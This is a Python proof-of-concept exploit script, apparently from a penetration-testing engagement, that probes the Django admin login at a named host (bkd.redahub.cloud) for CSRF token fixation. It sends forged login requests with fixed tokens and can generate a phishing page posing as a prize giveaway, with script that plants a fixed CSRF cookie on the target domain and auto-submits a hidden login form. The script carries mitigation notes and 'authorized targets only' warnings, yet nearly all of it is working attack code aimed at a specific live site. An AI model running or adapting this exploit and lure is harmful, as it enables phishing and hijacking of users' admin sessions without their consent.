#!/usr/bin/env python3
"""
CSRF Token Fixation Proof-of-Concept Exploit
Target: https://bkd.redahub.cloud/admin/login/
Author: Neural-OffSec-Team
Date: 15-11-2025
Engagement: REDAHUB-web-wildcard
CVSS: 7.1 (HIGH) - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N

Vulnerability: CWE-352 (CSRF) + CWE-384 (Session Fixation)

Description:
    Django Admin aceita tokens CSRF arbitrÃ¡rios e fixados quando o cookie
    correspondente Ã© fornecido. Isso permite ataques CSRF Token Fixation.

Usage:
    python3 15-11_17-41_csrf-token-fixation-poc.py
    python3 15-11_17-41_csrf-token-fixation-poc.py --custom-token "custom123..."
    python3 15-11_17-41_csrf-token-fixation-poc.py --generate-html
"""

import requests
import argparse
import sys
from typing import Tuple, Optional
from datetime import datetime

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CSRFTokenFixationExploit:
    def __init__(self, target_url: str = "https://bkd.redahub.cloud"):
        self.target_url = target_url
        self.admin_login = f"{target_url}/admin/login/"
        self.session = requests.Session()
        self.session.verify = False

        # Fixed tokens to test
        self.fixed_tokens = [
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "00000000000000000000000000000000",
            "11111111111111111111111111111111",
            "ffffffffffffffffffffffffffffffff",
            "test1234test1234test1234test1234",
        ]

    def test_csrf_token_fixation(self, fixed_token: str) -> Tuple[bool, int, str]:
        """
        Testa se o token CSRF fixado Ã© aceito pela aplicaÃ§Ã£o.

        Args:
            fixed_token: Token CSRF fixado para testar

        Returns:
            Tuple: (is_vulnerable, http_status, response_snippet)
        """
        print(f"[*] Testing fixed CSRF token: {fixed_token}")

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"csrftoken={fixed_token}",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        }

        data = {
            "username": "test_user",
            "password": "test_password",
            "csrfmiddlewaretoken": fixed_token,
        }

        try:
            response = self.session.post(
                self.admin_login,
                headers=headers,
                data=data,
                allow_redirects=False,
                timeout=10
            )

            status_code = response.status_code
            response_snippet = response.text[:500]

            # Se retornou 200 (pÃ¡gina de login) ao invÃ©s de 403 (CSRF failed)
            # entÃ£o o token fixado foi aceito â†’ VULNERÃVEL
            is_vulnerable = status_code == 200

            if is_vulnerable:
                print(f"[!] VULNERABLE! Server accepted fixed token: {fixed_token}")
                print(f"[!] HTTP Status: {status_code}")
            else:
                print(f"[-] Token rejected with HTTP {status_code}")

            return is_vulnerable, status_code, response_snippet

        except Exception as e:
            print(f"[-] Error testing token: {e}")
            return False, 0, str(e)

    def test_all_fixed_tokens(self) -> dict:
        """
        Testa todos os tokens fixados prÃ©-definidos.

        Returns:
            dict: Resultados dos testes
        """
        print("\n" + "="*70)
        print("CSRF TOKEN FIXATION VULNERABILITY TEST")
        print("="*70)
        print(f"Target: {self.admin_login}")
        print(f"Timestamp: {datetime.now().strftime('%d-%m-%Y %H:%M:%S BRT')}")
        print("="*70 + "\n")

        results = {
            "vulnerable": [],
            "not_vulnerable": [],
            "errors": []
        }

        for token in self.fixed_tokens:
            is_vuln, status, snippet = self.test_csrf_token_fixation(token)

            if is_vuln:
                results["vulnerable"].append({
                    "token": token,
                    "status": status,
                    "snippet": snippet
                })
            elif status == 0:
                results["errors"].append({
                    "token": token,
                    "error": snippet
                })
            else:
                results["not_vulnerable"].append({
                    "token": token,
                    "status": status
                })

            print()

        return results

    def generate_html_poc(self, fixed_token: str, output_file: str = "csrf-poc.html"):
        """
        Gera um PoC HTML para exploraÃ§Ã£o real da vulnerabilidade.

        Args:
            fixed_token: Token CSRF fixado a ser usado
            output_file: Nome do arquivo HTML de saÃ­da
        """
        html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>VocÃª ganhou um prÃªmio! - REDAHUB</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
        }}
        h1 {{
            font-size: 2.5em;
            margin-bottom: 20px;
        }}
        .loader {{
            border: 8px solid #f3f3f3;
            border-top: 8px solid #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
    <script>
        // CSRF Token Fixation Attack
        // Step 1: Fix the CSRF token via cookie
        document.cookie = "csrftoken={fixed_token}; domain=.redahub.cloud; path=/";

        // Step 2: Wait for cookie to be set, then submit form
        setTimeout(function() {{
            console.log("[CSRF PoC] Submitting CSRF attack form...");
            document.getElementById("csrf-form").submit();
        }}, 2000);

        // Optional: Log for debugging
        window.onload = function() {{
            console.log("[CSRF PoC] Cookie set:", document.cookie);
            console.log("[CSRF PoC] Fixed token:", "{fixed_token}");
        }};
    </script>
</head>
<body>
    <div class="container">
        <h1>ðŸŽ‰ ParabÃ©ns!</h1>
        <p>VocÃª foi selecionado para ganhar um prÃªmio exclusivo!</p>
        <div class="loader"></div>
        <p>Carregando seu prÃªmio...</p>
    </div>

    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="{self.admin_login}" method="POST" style="display:none;">
        <input type="hidden" name="csrfmiddlewaretoken" value="{fixed_token}">
        <input type="hidden" name="username" value="attacker@evil.com">
        <input type="hidden" name="password" value="evil_password_123">
        <input type="hidden" name="next" value="/admin/">
    </form>

    <!-- Proof of Concept Information (hidden) -->
    <!--
    CSRF Token Fixation PoC
    Target: {self.admin_login}
    Fixed Token: {fixed_token}
    Vulnerability: CWE-352 (CSRF) + CWE-384 (Session Fixation)
    CVSS: 7.1 (HIGH)

    Attack Flow:
    1. Victim visits this malicious page (e.g., via phishing)
    2. JavaScript fixes CSRF cookie to known value: {fixed_token}
    3. Form auto-submits to {self.admin_login}
    4. Server accepts fixed token (VULNERABLE!)
    5. If credentials are valid, attacker gains session

    Mitigation:
    - Validate CSRF token origin (server-generated only)
    - Implement SameSite=Strict for CSRF cookie
    - Reject predictable/fixed token patterns
    - Add additional validation layers

    Author: Neural-OffSec-Team
    Date: {datetime.now().strftime('%d-%m-%Y %H:%M BRT')}
    -->
</body>
</html>
"""

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"[+] HTML PoC generated: {output_file}")
        print(f"[+] Open this file in a browser to test the exploit")
        print(f"[!] WARNING: Only use on authorized targets!")

    def print_summary(self, results: dict):
        """
        Imprime um resumo dos resultados dos testes.

        Args:
            results: DicionÃ¡rio com resultados dos testes
        """
        print("\n" + "="*70)
        print("TEST SUMMARY")
        print("="*70)

        vuln_count = len(results["vulnerable"])
        safe_count = len(results["not_vulnerable"])
        error_count = len(results["errors"])

        print(f"\nðŸ”´ Vulnerable tokens: {vuln_count}")
        for item in results["vulnerable"]:
            print(f"   - {item['token']} (HTTP {item['status']})")

        print(f"\nðŸŸ¢ Rejected tokens: {safe_count}")
        for item in results["not_vulnerable"]:
            print(f"   - {item['token']} (HTTP {item['status']})")

        if error_count > 0:
            print(f"\nâš ï¸  Errors: {error_count}")
            for item in results["errors"]:
                print(f"   - {item['token']}: {item['error'][:100]}")

        print("\n" + "="*70)

        if vuln_count > 0:
            print("\n[!] VULNERABILITY CONFIRMED!")
            print("[!] Server accepts fixed CSRF tokens")
            print("[!] Severity: HIGH (CVSS 7.1)")
            print("[!] CWE-352 (CSRF) + CWE-384 (Session Fixation)")
            print("\n[+] Recommendation:")
            print("    1. Update Django CSRF middleware configuration")
            print("    2. Implement SameSite=Strict for CSRF cookie")
            print("    3. Validate token entropy and reject predictable patterns")
            print("    4. Add server-side token origin validation")
        else:
            print("\n[+] Server properly rejects fixed CSRF tokens")
            print("[+] CSRF protection appears to be working correctly")

        print("="*70 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description="CSRF Token Fixation PoC for Django Admin",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test all predefined fixed tokens
  python3 15-11_17-41_csrf-token-fixation-poc.py

  # Test a custom fixed token
  python3 15-11_17-41_csrf-token-fixation-poc.py --custom-token "mytoken123..."

  # Generate HTML PoC for exploitation
  python3 15-11_17-41_csrf-token-fixation-poc.py --generate-html

  # Test custom token and generate HTML
  python3 15-11_17-41_csrf-token-fixation-poc.py --custom-token "aaaa..." --generate-html

WARNING: Only use on authorized targets!
        """
    )

    parser.add_argument(
        '--target',
        default='https://bkd.redahub.cloud',
        help='Target URL (default: https://bkd.redahub.cloud)'
    )

    parser.add_argument(
        '--custom-token',
        help='Test a custom fixed token'
    )

    parser.add_argument(
        '--generate-html',
        action='store_true',
        help='Generate HTML PoC file'
    )

    parser.add_argument(
        '--output',
        default='csrf-poc.html',
        help='Output filename for HTML PoC (default: csrf-poc.html)'
    )

    args = parser.parse_args()

    # Initialize exploit
    exploit = CSRFTokenFixationExploit(target_url=args.target)

    # Test custom token if provided
    if args.custom_token:
        print(f"\n[*] Testing custom token: {args.custom_token}\n")
        is_vuln, status, snippet = exploit.test_csrf_token_fixation(args.custom_token)

        if is_vuln:
            print(f"\n[!] VULNERABLE! Custom token accepted")
            if args.generate_html:
                exploit.generate_html_poc(args.custom_token, args.output)
        else:
            print(f"\n[+] Custom token rejected (HTTP {status})")

    else:
        # Test all predefined tokens
        results = exploit.test_all_fixed_tokens()
        exploit.print_summary(results)

        # Generate HTML PoC if requested and vulnerability found
        if args.generate_html and results["vulnerable"]:
            best_token = results["vulnerable"][0]["token"]
            exploit.generate_html_poc(best_token, args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Exploit interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
